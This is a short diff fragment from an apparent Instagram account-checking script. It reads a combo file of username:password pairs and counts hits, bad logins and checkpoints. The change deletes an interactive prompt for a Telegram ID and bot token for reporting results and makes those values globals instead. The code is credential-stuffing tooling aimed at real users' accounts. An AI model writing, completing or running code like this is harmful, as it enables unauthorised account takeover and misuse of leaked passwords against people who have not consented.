@@ -93,19 +93,11 @@ def instagram1():
 	from datetime import datetime
 	r = requests.session()
 	import os, sys
-	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
-	agar=input(wd+"   You Want To Bot TELEGRAM Your Results (y,yes or n,no)")
-	if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
-		ID=input("    Your ID Telegram :")
-		token=input("    Token(bot) : ")
-	else:
-		pass
-	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
 	def loopPp():
 		try:
 			combo=input(" Path File :")
 			file = open(combo,'r').read().splitlines()
-			global bad, timeout, checkpoint, error, hits
+			global bad, timeout, checkpoint, error, hits, ID, token
 			for line in file:
 				user = line.split(':')[0]
 				pasw = line.split(':')[1]
